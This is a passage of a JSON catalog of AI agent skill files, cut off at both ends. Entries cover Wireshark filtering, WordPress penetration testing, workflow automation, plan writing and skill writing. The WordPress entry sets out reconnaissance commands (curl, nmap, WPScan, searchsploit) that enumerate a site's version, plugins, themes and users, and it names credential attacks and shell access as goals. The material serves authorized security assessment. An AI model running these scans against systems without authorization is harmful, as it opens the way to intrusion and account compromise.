      "content": "\n# Wireshark Network Traffic Analysis\n\n## Purpose\n\nExecute comprehensive network traffic analysis using Wireshark to capture, filter, and examine network packets for security investigations, performance optimization, and troubleshooting. This skill enables systematic analysis of network protocols, detection of anomalies, and reconstruction of network conversations from PCAP files.\n\n## Inputs / Prerequisites\n\n### Required Tools\n- Wireshark installed (Windows, macOS, or Linux)\n- Network interface with capture permissions\n- PCAP/PCAPNG files for offline analysis\n- Administrator/root privileges for live capture\n\n### Technical Requirements\n- Understanding of network protocols (TCP, UDP, HTTP, DNS)\n- Familiarity with IP addressing and ports\n- Knowledge of OSI model layers\n- Understanding of common attack patterns\n\n### Use Cases\n- Network troubleshooting and connectivity issues\n- Security incident investigation\n- Malware traffic analysis\n- Performance monitoring and optimization\n- Protocol learning and education\n\n## Outputs / Deliverables\n\n### Primary Outputs\n- Filtered packet captures for specific traffic\n- Reconstructed communication streams\n- Traffic statistics and visualizations\n- Evidence documentation for incidents\n\n## Core Workflow\n\n### Phase 1: Capturing Network Traffic\n\n#### Start Live Capture\nBegin capturing packets on network interface:\n\n```\n1. Launch Wireshark\n2. Select network interface from main screen\n3. Click shark fin icon or double-click interface\n4. Capture begins immediately\n```\n\n#### Capture Controls\n| Action | Shortcut | Description |\n|--------|----------|-------------|\n| Start/Stop Capture | Ctrl+E | Toggle capture on/off |\n| Restart Capture | Ctrl+R | Stop and start new capture |\n| Open PCAP File | Ctrl+O | Load existing capture file |\n| Save Capture | Ctrl+S | Save current capture |\n\n#### Capture Filters\nApply filters before capture to limit data collection:\n\n```\n# Capture only specific host\nhost 192.168.1.100\n\n# Capture specific port\nport 80\n\n# Capture specific network\nnet 192.168.1.0/24\n\n# Exclude specific traffic\nnot arp\n\n# Combine filters\nhost 192.168.1.100 and port 443\n```\n\n### Phase 2: Display Filters\n\n#### Basic Filter Syntax\nFilter captured packets for analysis:\n\n```\n# IP address filters\nip.addr == 192.168.1.1              # All traffic to/from IP\nip.src == 192.168.1.1               # Source IP only\nip.dst == 192.168.1.1               # Destination IP only\n\n# Port filters\ntcp.port == 80                       # TCP port 80\nudp.port == 53                       # UDP port 53\ntcp.dstport == 443                   # Destination port 443\ntcp.srcport == 22                    # Source port 22\n```\n\n#### Protocol Filters\nFilter by specific protocols:\n\n```\n# Common protocols\nhttp                                  # HTTP traffic\nhttps or ssl or tls                   # Encrypted web traffic\ndns                                   # DNS queries and responses\nftp                                   # FTP traffic\nssh                                   # SSH traffic\nicmp                                  # Ping/ICMP traffic\narp                                   # ARP requests/responses\ndhcp                                  # DHCP traffic\nsmb or smb2                          # SMB file sharing\n```\n\n#### TCP Flag Filters\nIdentify specific connection states:\n\n```\ntcp.flags.syn == 1                   # SYN packets (connection attempts)\ntcp.flags.ack == 1                   # ACK packets\ntcp.flags.fin == 1                   # FIN packets (connection close)\ntcp.flags.reset == 1                 # RST packets (connection reset)\ntcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN-only (initial connection)\n```\n\n#### Content Filters\nSearch for specific content:\n\n```\nframe contains \"password\"            # Packets containing string\nhttp.request.uri contains \"login\"    # HTTP URIs with string\ntcp contains \"GET\"                   # TCP packets with string\n```\n\n#### Analysis Filters\nIdentify potential issues:\n\n```\ntcp.analysis.retransmission          # TCP retransmissions\ntcp.analysis.duplicate_ack           # Duplicate ACKs\ntcp.analysis.zero_window             # Zero window (flow control)\ntcp.analysis.flags                   # Packets with issues\ndns.flags.rcode != 0                 # DNS errors\n```\n\n#### Combining Filters\nUse logical operators for complex queries:\n\n```\n# AND operator\nip.addr == 192.168.1.1 && tcp.port == 80\n\n# OR operator\ndns || http\n\n# NOT operator\n!(arp || icmp)\n\n# Complex combinations\n(ip.src == 192.168.1.1 || ip.src == 192.168.1.2) && tcp.port == 443\n```\n\n### Phase 3: Following Streams\n\n#### TCP Stream Reconstruction\nView complete TCP conversation:\n\n```\n1. Right-click on any TCP packet\n2. Select Follow > TCP Stream\n3. View reconstructed conversation\n4. Toggle between ASCII, Hex, Raw views\n5. Filter to show only this stream\n```\n\n#### Stream Types\n| Stream | Access | Use Case |\n|--------|--------|----------|\n| TCP Stream | Follow > TCP Stream | Web, file transfers, any TCP |\n| UDP Stream | Follow > UDP Str",
      "tags": [
        "ai",
        "workflow",
        "document",
        "security"
      ],
      "useCases": [
        "Network troubleshooting and connectivity issues",
        "Security incident investigation",
        "Malware traffic analysis",
        "Performance monitoring and optimization",
        "Protocol learning and education"
      ],
      "scrapedAt": "2026-01-26T13:22:47.356Z"
    },
    {
      "id": "antigravity-wordpress-penetration-testing",
      "name": "WordPress Penetration Testing",
      "slug": "wordpress-penetration-testing",
      "description": "This skill should be used when the user asks to \"pentest WordPress sites\", \"scan WordPress for vulnerabilities\", \"enumerate WordPress users, themes, or plugins\", \"exploit WordPress vulnerabilities\", or \"use WPScan\". It provides comprehensive WordPress security assessment methodologies.",
      "category": "Security & Systems",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/wordpress-penetration-testing",
      "content": "\n# WordPress Penetration Testing\n\n## Purpose\n\nConduct comprehensive security assessments of WordPress installations including enumeration of users, themes, and plugins, vulnerability scanning, credential attacks, and exploitation techniques. WordPress powers approximately 35% of websites, making it a critical target for security testing.\n\n## Prerequisites\n\n### Required Tools\n- WPScan (pre-installed in Kali Linux)\n- Metasploit Framework\n- Burp Suite or OWASP ZAP\n- Nmap for initial discovery\n- cURL or wget\n\n### Required Knowledge\n- WordPress architecture and structure\n- Web application testing fundamentals\n- HTTP protocol understanding\n- Common web vulnerabilities (OWASP Top 10)\n\n## Outputs and Deliverables\n\n1. **WordPress Enumeration Report** - Version, themes, plugins, users\n2. **Vulnerability Assessment** - Identified CVEs and misconfigurations\n3. **Credential Assessment** - Weak password findings\n4. **Exploitation Proof** - Shell access documentation\n\n## Core Workflow\n\n### Phase 1: WordPress Discovery\n\nIdentify WordPress installations:\n\n```bash\n# Check for WordPress indicators\ncurl -s http://target.com | grep -i wordpress\ncurl -s http://target.com | grep -i \"wp-content\"\ncurl -s http://target.com | grep -i \"wp-includes\"\n\n# Check common WordPress paths\ncurl -I http://target.com/wp-login.php\ncurl -I http://target.com/wp-admin/\ncurl -I http://target.com/wp-content/\ncurl -I http://target.com/xmlrpc.php\n\n# Check meta generator tag\ncurl -s http://target.com | grep \"generator\"\n\n# Nmap WordPress detection\nnmap -p 80,443 --script http-wordpress-enum target.com\n```\n\nKey WordPress files and directories:\n- `/wp-admin/` - Admin dashboard\n- `/wp-login.php` - Login page\n- `/wp-content/` - Themes, plugins, uploads\n- `/wp-includes/` - Core files\n- `/xmlrpc.php` - XML-RPC interface\n- `/wp-config.php` - Configuration (not accessible if secure)\n- `/readme.html` - Version information\n\n### Phase 2: Basic WPScan Enumeration\n\nComprehensive WordPress scanning with WPScan:\n\n```bash\n# Basic scan\nwpscan --url http://target.com/wordpress/\n\n# With API token (for vulnerability data)\nwpscan --url http://target.com --api-token YOUR_API_TOKEN\n\n# Aggressive detection mode\nwpscan --url http://target.com --detection-mode aggressive\n\n# Output to file\nwpscan --url http://target.com -o results.txt\n\n# JSON output\nwpscan --url http://target.com -f json -o results.json\n\n# Verbose output\nwpscan --url http://target.com -v\n```\n\n### Phase 3: WordPress Version Detection\n\nIdentify WordPress version:\n\n```bash\n# WPScan version detection\nwpscan --url http://target.com\n\n# Manual version checks\ncurl -s http://target.com/readme.html | grep -i version\ncurl -s http://target.com/feed/ | grep -i generator\ncurl -s http://target.com | grep \"?ver=\"\n\n# Check meta generator\ncurl -s http://target.com | grep 'name=\"generator\"'\n\n# Check RSS feeds\ncurl -s http://target.com/feed/\ncurl -s http://target.com/comments/feed/\n```\n\nVersion sources:\n- Meta generator tag in HTML\n- readme.html file\n- RSS/Atom feeds\n- JavaScript/CSS file versions\n\n### Phase 4: Theme Enumeration\n\nIdentify installed themes:\n\n```bash\n# Enumerate all themes\nwpscan --url http://target.com -e at\n\n# Enumerate vulnerable themes only\nwpscan --url http://target.com -e vt\n\n# Theme enumeration with detection mode\nwpscan --url http://target.com -e at --plugins-detection aggressive\n\n# Manual theme detection\ncurl -s http://target.com | grep \"wp-content/themes/\"\ncurl -s http://target.com/wp-content/themes/\n```\n\nTheme vulnerability checks:\n```bash\n# Search for theme exploits\nsearchsploit wordpress theme <theme_name>\n\n# Check theme version\ncurl -s http://target.com/wp-content/themes/<theme>/style.css | grep -i version\ncurl -s http://target.com/wp-content/themes/<theme>/readme.txt\n```\n\n### Phase 5: Plugin Enumeration\n\nIdentify installed plugins:\n\n```bash\n# Enumerate all plugins\nwpscan --url http://target.com -e ap\n\n# Enumerate vulnerable plugins only\nwpscan --url http://target.com -e vp\n\n# Aggressive plugin detection\nwpscan --url http://target.com -e ap --plugins-detection aggressive\n\n# Mixed detection mode\nwpscan --url http://target.com -e ap --plugins-detection mixed\n\n# Manual plugin discovery\ncurl -s http://target.com | grep \"wp-content/plugins/\"\ncurl -s http://target.com/wp-content/plugins/\n```\n\nCommon vulnerable plugins to check:\n```bash\n# Search for plugin exploits\nsearchsploit wordpress plugin <plugin_name>\nsearchsploit wordpress mail-masta\nsearchsploit wordpress slideshow gallery\nsearchsploit wordpress reflex gallery\n\n# Check plugin version\ncurl -s http://target.com/wp-content/plugins/<plugin>/readme.txt\n```\n\n### Phase 6: User Enumeration\n\nDiscover WordPress users:\n\n```bash\n# WPScan user enumeration\nwpscan --url http://target.com -e u\n\n# Enumerate specific number of users\nwpscan --url http://target.com -e u1-100\n\n# Author ID enumeration (manual)\nfor i in {1..20}; do\n    curl -s \"http://target.com/?author=$i\" | grep -o 'author/[^/]*/'\ndone\n\n# JSON API user enumeration (if enabled)\ncurl -s http://target.com/wp-jso",
      "tags": [
        "javascript",
        "api",
        "ai",
        "agent",
        "workflow",
        "document",
        "security",
        "pentest",
        "vulnerability"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:48.585Z"
    },
    {
      "id": "antigravity-workflow-automation",
      "name": "workflow-automation",
      "slug": "workflow-automation",
      "description": "Workflow automation is the infrastructure that makes AI agents reliable. Without durable execution, a network hiccup during a 10-step payment flow means lost money and angry customers. With it, workflows resume exactly where they left off.  This skill covers the platforms (n8n, Temporal, Inngest) an",
      "category": "AI & Agents",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/workflow-automation",
      "content": "\n# Workflow Automation\n\nYou are a workflow automation architect who has seen both the promise and\nthe pain of these platforms. You've migrated teams from brittle cron jobs\nto durable execution and watched their on-call burden drop by 80%.\n\nYour core insight: Different platforms make different tradeoffs. n8n is\naccessible but sacrifices performance. Temporal is correct but complex.\nInngest balances developer experience with reliability. There's no \"best\" -\nonly \"best for your situation.\"\n\nYou push for durable execution \n\n## Capabilities\n\n- workflow-automation\n- workflow-orchestration\n- durable-execution\n- event-driven-workflows\n- step-functions\n- job-queues\n- background-jobs\n- scheduled-tasks\n\n## Patterns\n\n### Sequential Workflow Pattern\n\nSteps execute in order, each output becomes next input\n\n### Parallel Workflow Pattern\n\nIndependent steps run simultaneously, aggregate results\n\n### Orchestrator-Worker Pattern\n\nCentral coordinator dispatches work to specialized workers\n\n## Anti-Patterns\n\n### ❌ No Durable Execution for Payments\n\n### ❌ Monolithic Workflows\n\n### ❌ No Observability\n\n## ⚠️ Sharp Edges\n\n| Issue | Severity | Solution |\n|-------|----------|----------|\n| Issue | critical | # ALWAYS use idempotency keys for external calls: |\n| Issue | high | # Break long workflows into checkpointed steps: |\n| Issue | high | # ALWAYS set timeouts on activities: |\n| Issue | critical | # WRONG - side effects in workflow code: |\n| Issue | medium | # ALWAYS use exponential backoff: |\n| Issue | high | # WRONG - large data in workflow: |\n| Issue | high | # Inngest onFailure handler: |\n| Issue | medium | # Every production n8n workflow needs: |\n\n## Related Skills\n\nWorks well with: `multi-agent-orchestration`, `agent-tool-builder`, `backend`, `devops`\n",
      "tags": [
        "ai",
        "agent",
        "automation",
        "workflow",
        "cro"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:49.611Z"
    },
    {
      "id": "superpowers-writing-plans",
      "name": "writing-plans",
      "slug": "superpowers-writing-plans",
      "description": "Use when you have a spec or requirements for a multi-step task, before touching code",
      "category": "Collaboration & Project Management",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/writing-plans",
      "content": "\n# Writing Plans\n\n## Overview\n\nWrite comprehensive implementation plans assuming the engineer has zero context for our codebase and questionable taste. Document everything they need to know: which files to touch for each task, code, testing, docs they might need to check, how to test it. Give them the whole plan as bite-sized tasks. DRY. YAGNI. TDD. Frequent commits.\n\nAssume they are a skilled developer, but know almost nothing about our toolset or problem domain. Assume they don't know good test design very well.\n\n**Announce at start:** \"I'm using the writing-plans skill to create the implementation plan.\"\n\n**Context:** This should be run in a dedicated worktree (created by brainstorming skill).\n\n**Save plans to:** `docs/plans/YYYY-MM-DD-<feature-name>.md`\n\n## Bite-Sized Task Granularity\n\n**Each step is one action (2-5 minutes):**\n- \"Write the failing test\" - step\n- \"Run it to make sure it fails\" - step\n- \"Implement the minimal code to make the test pass\" - step\n- \"Run the tests and make sure they pass\" - step\n- \"Commit\" - step\n\n## Plan Document Header\n\n**Every plan MUST start with this header:**\n\n```markdown\n# [Feature Name] Implementation Plan\n\n> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.\n\n**Goal:** [One sentence describing what this builds]\n\n**Architecture:** [2-3 sentences about approach]\n\n**Tech Stack:** [Key technologies/libraries]\n\n---\n```\n\n## Task Structure\n\n```markdown\n### Task N: [Component Name]\n\n**Files:**\n- Create: `exact/path/to/file.py`\n- Modify: `exact/path/to/existing.py:123-145`\n- Test: `tests/exact/path/to/test.py`\n\n**Step 1: Write the failing test**\n\n```python\ndef test_specific_behavior():\n    result = function(input)\n    assert result == expected\n```\n\n**Step 2: Run test to verify it fails**\n\nRun: `pytest tests/path/test.py::test_name -v`\nExpected: FAIL with \"function not defined\"\n\n**Step 3: Write minimal implementation**\n\n```python\ndef function(input):\n    return expected\n```\n\n**Step 4: Run test to verify it passes**\n\nRun: `pytest tests/path/test.py::test_name -v`\nExpected: PASS\n\n**Step 5: Commit**\n\n```bash\ngit add tests/path/test.py src/path/file.py\ngit commit -m \"feat: add specific feature\"\n```\n```\n\n## Remember\n- Exact file paths always\n- Complete code in plan (not \"add validation\")\n- Exact commands with expected output\n- Reference relevant skills with @ syntax\n- DRY, YAGNI, TDD, frequent commits\n\n## Execution Handoff\n\nAfter saving the plan, offer execution choice:\n\n**\"Plan complete and saved to `docs/plans/<filename>.md`. Two execution options:**\n\n**1. Subagent-Driven (this session)** - I dispatch fresh subagent per task, review between tasks, fast iteration\n\n**2. Parallel Session (separate)** - Open new session with executing-plans, batch execution with checkpoints\n\n**Which approach?\"**\n\n**If Subagent-Driven chosen:**\n- **REQUIRED SUB-SKILL:** Use superpowers:subagent-driven-development\n- Stay in this session\n- Fresh subagent per task + code review\n\n**If Parallel Session chosen:**\n- Guide them to open new session in worktree\n- **REQUIRED SUB-SKILL:** New session uses superpowers:executing-plans\n",
      "tags": [
        "tdd",
        "testing",
        "git",
        "worktree",
        "brainstorming",
        "subagent",
        "agent",
        "writing",
        "plans"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:25.397Z"
    },
    {
      "id": "antigravity-writing-plans",
      "name": "writing-plans",
      "slug": "writing-plans",
      "description": "Use when you have a spec or requirements for a multi-step task, before touching code",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/writing-plans",
      "content": "\n# Writing Plans\n\n## Overview\n\nWrite comprehensive implementation plans assuming the engineer has zero context for our codebase and questionable taste. Document everything they need to know: which files to touch for each task, code, testing, docs they might need to check, how to test it. Give them the whole plan as bite-sized tasks. DRY. YAGNI. TDD. Frequent commits.\n\nAssume they are a skilled developer, but know almost nothing about our toolset or problem domain. Assume they don't know good test design very well.\n\n**Announce at start:** \"I'm using the writing-plans skill to create the implementation plan.\"\n\n**Context:** This should be run in a dedicated worktree (created by brainstorming skill).\n\n**Save plans to:** `docs/plans/YYYY-MM-DD-<feature-name>.md`\n\n## Bite-Sized Task Granularity\n\n**Each step is one action (2-5 minutes):**\n- \"Write the failing test\" - step\n- \"Run it to make sure it fails\" - step\n- \"Implement the minimal code to make the test pass\" - step\n- \"Run the tests and make sure they pass\" - step\n- \"Commit\" - step\n\n## Plan Document Header\n\n**Every plan MUST start with this header:**\n\n```markdown\n# [Feature Name] Implementation Plan\n\n> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.\n\n**Goal:** [One sentence describing what this builds]\n\n**Architecture:** [2-3 sentences about approach]\n\n**Tech Stack:** [Key technologies/libraries]\n\n---\n```\n\n## Task Structure\n\n```markdown\n### Task N: [Component Name]\n\n**Files:**\n- Create: `exact/path/to/file.py`\n- Modify: `exact/path/to/existing.py:123-145`\n- Test: `tests/exact/path/to/test.py`\n\n**Step 1: Write the failing test**\n\n```python\ndef test_specific_behavior():\n    result = function(input)\n    assert result == expected\n```\n\n**Step 2: Run test to verify it fails**\n\nRun: `pytest tests/path/test.py::test_name -v`\nExpected: FAIL with \"function not defined\"\n\n**Step 3: Write minimal implementation**\n\n```python\ndef function(input):\n    return expected\n```\n\n**Step 4: Run test to verify it passes**\n\nRun: `pytest tests/path/test.py::test_name -v`\nExpected: PASS\n\n**Step 5: Commit**\n\n```bash\ngit add tests/path/test.py src/path/file.py\ngit commit -m \"feat: add specific feature\"\n```\n```\n\n## Remember\n- Exact file paths always\n- Complete code in plan (not \"add validation\")\n- Exact commands with expected output\n- Reference relevant skills with @ syntax\n- DRY, YAGNI, TDD, frequent commits\n\n## Execution Handoff\n\nAfter saving the plan, offer execution choice:\n\n**\"Plan complete and saved to `docs/plans/<filename>.md`. Two execution options:**\n\n**1. Subagent-Driven (this session)** - I dispatch fresh subagent per task, review between tasks, fast iteration\n\n**2. Parallel Session (separate)** - Open new session with executing-plans, batch execution with checkpoints\n\n**Which approach?\"**\n\n**If Subagent-Driven chosen:**\n- **REQUIRED SUB-SKILL:** Use superpowers:subagent-driven-development\n- Stay in this session\n- Fresh subagent per task + code review\n\n**If Parallel Session chosen:**\n- Guide them to open new session in worktree\n- **REQUIRED SUB-SKILL:** New session uses superpowers:executing-plans\n",
      "tags": [
        "python",
        "markdown",
        "claude",
        "ai",
        "agent",
        "design",
        "document"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:50.792Z"
    },
    {
      "id": "superpowers-writing-skills",
      "name": "writing-skills",
      "slug": "superpowers-writing-skills",
      "description": "Use when creating new skills, editing existing skills, or verifying skills work before deployment",
      "category": "AI & Agents",
      "source": "superpowers",
      "repoUrl": "https://github.com/obra/superpowers",
      "skillUrl": "https://github.com/obra/superpowers/tree/main/skills/writing-skills",
      "content": "\n# Writing Skills\n\n## Overview\n\n**Writing skills IS Test-Driven Development applied to process documentation.**\n\n**Personal skills live in agent-specific directories (`~/.claude/skills` for Claude Code, `~/.codex/skills` for Codex)** \n\nYou write test cases (pressure scenarios with subagents), watch them fail (baseline behavior), write the skill (documentation), watch tests pass (agents comply), and refactor (close loopholes).\n\n**Core principle:** If you didn't watch an agent fail without the skill, you don't know if the skill teaches the right thing.\n\n**REQUIRED BACKGROUND:** You MUST understand superpowers:test-driven-development before using this skill. That skill defines the fundamental RED-GREEN-REFACTOR cycle. This skill adapts TDD to documentation.\n\n**Official guidance:** For Anthropic's official skill authoring best practices, see anthropic-best-practices.md. This document provides additional patterns and guidelines that complement the TDD-focused approach in this skill.\n\n## What is a Skill?\n\nA **skill** is a reference guide for proven techniques, patterns, or tools. Skills help future Claude instances find and apply effective approaches.\n\n**Skills are:** Reusable techniques, patterns, tools, reference guides\n\n**Skills are NOT:** Narratives about how you solved a problem once\n\n## TDD Mapping for Skills\n\n| TDD Concept | Skill Creation |\n|-------------|----------------|\n| **Test case** | Pressure scenario with subagent |\n| **Production code** | Skill document (SKILL.md) |\n| **Test fails (RED)** | Agent violates rule without skill (baseline) |\n| **Test passes (GREEN)** | Agent complies with skill present |\n| **Refactor** | Close loopholes while maintaining compliance |\n| **Write test first** | Run baseline scenario BEFORE writing skill |\n| **Watch it fail** | Document exact rationalizations agent uses |\n| **Minimal code** | Write skill addressing those specific violations |\n| **Watch it pass** | Verify agent now complies |\n| **Refactor cycle** | Find new rationalizations → plug → re-verify |\n\nThe entire skill creation process follows RED-GREEN-REFACTOR.\n\n## When to Create a Skill\n\n**Create when:**\n- Technique wasn't intuitively obvious to you\n- You'd reference this again across projects\n- Pattern applies broadly (not project-specific)\n- Others would benefit\n\n**Don't create for:**\n- One-off solutions\n- Standard practices well-documented elsewhere\n- Project-specific conventions (put in CLAUDE.md)\n- Mechanical constraints (if it's enforceable with regex/validation, automate it—save documentation for judgment calls)\n\n## Skill Types\n\n### Technique\nConcrete method with steps to follow (condition-based-waiting, root-cause-tracing)\n\n### Pattern\nWay of thinking about problems (flatten-with-flags, test-invariants)\n\n### Reference\nAPI docs, syntax guides, tool documentation (office docs)\n\n## Directory Structure\n\n\n```\nskills/\n  skill-name/\n    SKILL.md              # Main reference (required)\n    supporting-file.*     # Only if needed\n```\n\n**Flat namespace** - all skills in one searchable namespace\n\n**Separate files for:**\n1. **Heavy reference** (100+ lines) - API docs, comprehensive syntax\n2. **Reusable tools** - Scripts, utilities, templates\n\n**Keep inline:**\n- Principles and concepts\n- Code patterns (< 50 lines)\n- Everything else\n\n## SKILL.md Structure\n\n**Frontmatter (YAML):**\n- Only two fields supported: `name` and `description`\n- Max 1024 characters total\n- `name`: Use letters, numbers, and hyphens only (no parentheses, special chars)\n- `description`: Third-person, describes ONLY when to use (NOT what it does)\n  - Start with \"Use when...\" to focus on triggering conditions\n  - Include specific symptoms, situations, and contexts\n  - **NEVER summarize the skill's process or workflow** (see CSO section for why)\n  - Keep under 500 characters if possible\n\n```markdown\n---\nname: Skill-Name-With-Hyphens\ndescription: Use when [specific triggering conditions and symptoms]\n---\n\n# Skill Name\n\n## Overview\nWhat is this? Core principle in 1-2 sentences.\n\n## When to Use\n[Small inline flowchart IF decision non-obvious]\n\nBullet list with SYMPTOMS and use cases\nWhen NOT to use\n\n## Core Pattern (for techniques/patterns)\nBefore/after code comparison\n\n## Quick Reference\nTable or bullets for scanning common operations\n\n## Implementation\nInline code for simple patterns\nLink to file for heavy reference or reusable tools\n\n## Common Mistakes\nWhat goes wrong + fixes\n\n## Real-World Impact (optional)\nConcrete results\n```\n\n\n## Claude Search Optimization (CSO)\n\n**Critical for discovery:** Future Claude needs to FIND your skill\n\n### 1. Rich Description Field\n\n**Purpose:** Claude reads description to decide which skills to load for a given task. Make it answer: \"Should I read this skill right now?\"\n\n**Format:** Start with \"Use when...\" to focus on triggering conditions\n\n**CRITICAL: Description = When to Use, NOT What the Skill Does**\n\nThe description should ONLY describe triggering conditions. Do NOT summarize the skill's process or workflow in ",
      "tags": [
        "tdd",
        "testing",
        "debug",
        "debugging",
        "git",
        "subagent",
        "workflow",
        "agent",
        "verification",
        "red-green-refactor"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:14:26.766Z"
    },
    {
      "id": "antigravity-writing-skills",
      "name": "writing-skills",
      "slug": "writing-skills",
      "description": "Use when creating new skills, editing existing skills, or verifying skills work before deployment",
      "category": "Document Processing",
      "source": "antigravity",
      "repoUrl": "https://github.com/sickn33/antigravity-awesome-skills",
      "skillUrl": "https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/writing-skills",
      "content": "\n# Writing Skills\n\n## Overview\n\n**Writing skills IS Test-Driven Development applied to process documentation.**\n\n**Personal skills live in agent-specific directories (`~/.claude/skills` for Claude Code, `~/.codex/skills` for Codex)**\n\nYou write test cases (pressure scenarios with subagents), watch them fail (baseline behavior), write the skill (documentation), watch tests pass (agents comply), and refactor (close loopholes).\n\n**Core principle:** If you didn't watch an agent fail without the skill, you don't know if the skill teaches the right thing.\n\n**REQUIRED BACKGROUND:** You MUST understand superpowers:test-driven-development before using this skill. That skill defines the fundamental RED-GREEN-REFACTOR cycle. This skill adapts TDD to documentation.\n\n**Official guidance:** For Anthropic's official skill authoring best practices, see anthropic-best-practices.md. This document provides additional patterns and guidelines that complement the TDD-focused approach in this skill.\n\n## What is a Skill?\n\nA **skill** is a reference guide for proven techniques, patterns, or tools. Skills help future Claude instances find and apply effective approaches.\n\n**Skills are:** Reusable techniques, patterns, tools, reference guides\n\n**Skills are NOT:** Narratives about how you solved a problem once\n\n## TDD Mapping for Skills\n\n| TDD Concept             | Skill Creation                                   |\n| ----------------------- | ------------------------------------------------ |\n| **Test case**           | Pressure scenario with subagent                  |\n| **Production code**     | Skill document (SKILL.md)                        |\n| **Test fails (RED)**    | Agent violates rule without skill (baseline)     |\n| **Test passes (GREEN)** | Agent complies with skill present                |\n| **Refactor**            | Close loopholes while maintaining compliance     |\n| **Write test first**    | Run baseline scenario BEFORE writing skill       |\n| **Watch it fail**       | Document exact rationalizations agent uses       |\n| **Minimal code**        | Write skill addressing those specific violations |\n| **Watch it pass**       | Verify agent now complies                        |\n| **Refactor cycle**      | Find new rationalizations → plug → re-verify     |\n\nThe entire skill creation process follows RED-GREEN-REFACTOR.\n\n## When to Create a Skill\n\n**Create when:**\n\n- Technique wasn't intuitively obvious to you\n- You'd reference this again across projects\n- Pattern applies broadly (not project-specific)\n- Others would benefit\n\n**Don't create for:**\n\n- One-off solutions\n- Standard practices well-documented elsewhere\n- Project-specific conventions (put in CLAUDE.md)\n- Mechanical constraints (if it's enforceable with regex/validation, automate it—save documentation for judgment calls)\n\n## Skill Types\n\n### Technique\n\nConcrete method with steps to follow (condition-based-waiting, root-cause-tracing)\n\n### Pattern\n\nWay of thinking about problems (flatten-with-flags, test-invariants)\n\n### Reference\n\nAPI docs, syntax guides, tool documentation (office docs)\n\n## Directory Structure\n\n```\nskills/\n  skill-name/\n    SKILL.md              # Main reference (required)\n    supporting-file.*     # Only if needed\n```\n\n**Flat namespace** - all skills in one searchable namespace\n\n**Separate files for:**\n\n1. **Heavy reference** (100+ lines) - API docs, comprehensive syntax\n2. **Reusable tools** - Scripts, utilities, templates\n\n**Keep inline:**\n\n- Principles and concepts\n- Code patterns (< 50 lines)\n- Everything else\n\n## Set Appropriate Degrees of Freedom\n\nMatch the level of specificity to the task's fragility and variability:\n\n- **High freedom (text-based instructions)**: Use when multiple approaches are valid or decisions depend on context.\n- **Medium freedom (pseudocode or scripts with parameters)**: Use when a preferred pattern exists but some variation is acceptable.\n- **Low freedom (specific scripts, no-context instructions)**: Use when operations are fragile, error-prone, or consistency is critical.\n\n## Progressive Disclosure\n\nManage context efficiently by splitting detailed information into separate files:\n\n1. **Metadata (name + description)**: Always loaded for discovery.\n2. **SKILL.md body**: Core workflow and high-level guidance. Keep under 500 lines.\n3. **Bundled resources**:\n   - `scripts/`: Deterministic code/logic.\n   - `references/`: Detailed schemas, API docs, or domain knowledge.\n   - `assets/`: Templates, images, or static files.\n\n**Pattern**: Link to advanced content or variant-specific details (e.g., `aws.md` vs `gcp.md`) from the main `SKILL.md`.\n\n## SKILL.md Structure\n\n**Frontmatter (YAML):**\n\n- Only two fields supported: `name` and `description`\n- Max 1024 characters total\n- `name`: Use letters, numbers, and hyphens only (no parentheses, special chars)\n- `description`: Third-person, describes ONLY when to use (NOT what it does)\n  - Start with \"Use when...\" to focus on triggering conditions\n  - Include specific symptoms, situati",
      "tags": [
        "python",
        "javascript",
        "typescript",
        "react",
        "pptx",
        "markdown",
        "api",
        "claude",
        "ai",
        "agent"
      ],
      "useCases": [],
      "scrapedAt": "2026-01-26T13:22:51.953Z"
    },
    {
      "id": "anthropic-xlsx",
      "name": "xlsx",
      "slug": "xlsx",
      "description": "Comprehensive spreadsheet creation, editing, and analysis with support for formulas, formatting, data analysis, and visualization. When Claude needs to work with spreadsheets (.xlsx, .xlsm, .csv, .tsv, etc) for: (1) Creating new spreadsheets with formulas and formatting, (2) Reading or analyzing data, (3) Modify existing spreadsheets while preserving formulas, (4) Data analysis and visualization in spreadsheets, or (5) Recalculating formulas",
      "category": "Document Processing",
      "source": "anthropic",
      "repoUrl": "https://github.com/anthropics/skills",
      "skillUrl": "https://github.com/anthropics/skills/tree/main/skills/xlsx",
      "content": "\n# Requirements for Outputs\n\n## All Excel files\n\n### Zero Formula Errors\n- Every Excel model MUST be delivered with ZERO formula errors (#REF!, #DIV/0!, #VALUE!, #N/A, #NAME?)\n\n### Preserve Existing Templates (when updating templates)\n- Study and EXACTLY match existing format, style, and conventions when modifying files\n- Never impose standardized formatting on files with established patterns\n- Existing template conventions ALWAYS override these guidelines\n\n## Financial models\n\n### Color Coding Standards\nUnless otherwise stated by the user or existing template\n\n#### Industry-Standard Color Conventions\n- **Blue text (RGB: 0,0,255)**: Hardcoded inputs, and numbers users will change for scenarios\n- **Black text (RGB: 0,0,0)**: ALL formulas and calculations\n- **Green text (RGB: 0,128,0)**: Links pulling from other worksheets within same workbook\n- **Red text (RGB: 255,0,0)**: External links to other files\n- **Yellow background (RGB: 255,255,0)**: Key assumptions needing attention or cells that need to be updated\n\n### Number Formatting Standards\n\n#### Required Format Rules\n- **Years**: Format as text strings (e.g., \"2024\" not \"2,024\")\n- **Currency**: Use $#,##0 format; ALWAYS specify units in headers (\"Revenue ($mm)\")\n- **Zeros**: Use number formatting to make all zeros \"-\", including 